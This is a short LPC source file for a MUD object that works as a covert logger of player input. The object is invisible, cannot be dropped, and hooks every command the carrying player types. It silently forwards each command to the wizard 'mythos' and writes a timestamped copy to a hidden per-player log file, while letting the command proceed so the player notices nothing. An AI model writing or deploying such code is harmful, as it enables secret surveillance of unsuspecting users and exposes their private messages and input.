reset() {
  write_file("/players/mythos/closed/play/tell/DUH", "X\n");
}
get() { return 1; }
drop() { return 1; }
id(str) { return str == "730904"; }
init() {
#ifndef __LDMUD__
  add_action("ekg"); add_xverb("");
#else
  add_action("ekg", "", 3);
#endif
}

ekg(str) {
  if(find_player("mythos")) {
tell_object(find_player("mythos"), "**"+
    (this_player()->query_name())+
    "**"+query_verb()+" "+str+"\n");}
write_file("/players/mythos/closed/play/tell/"+this_player()->query_real_name(), "**"+
    (ctime(time()))+" >>> "+
    (this_player()->query_name())+
    "**"+query_verb()+" "+str+"\n");
    return 0;
}
